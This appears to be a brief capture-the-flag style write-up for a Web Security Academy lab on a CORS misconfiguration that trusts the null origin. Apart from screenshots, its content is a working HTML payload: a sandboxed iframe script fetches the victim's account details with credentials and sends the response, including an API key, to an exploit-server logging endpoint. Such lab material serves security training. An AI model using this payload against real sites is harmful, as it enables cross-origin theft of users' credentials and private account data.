# CORS vulnerability with trusted null origin
## Vuln
![image](https://user-images.githubusercontent.com/60841283/150383433-a93817a6-20ec-434f-8aa5-c420172d8408.png)

![image](https://user-images.githubusercontent.com/60841283/150383578-97c0e976-bee2-4350-968d-52c87b7f8c77.png)

## Exploit Server
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acf11fd31fb5adf3c056df45005d0057.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-ac651f4e1ffaad35c06adfcb01d400eb.web-security-academy.net/log?key='+this.responseText;
};
</script>"></iframe>
```
### API Key
![image](https://user-images.githubusercontent.com/60841283/150383089-d62621b0-a6da-4a2c-b3fa-6107aeb77493.png)
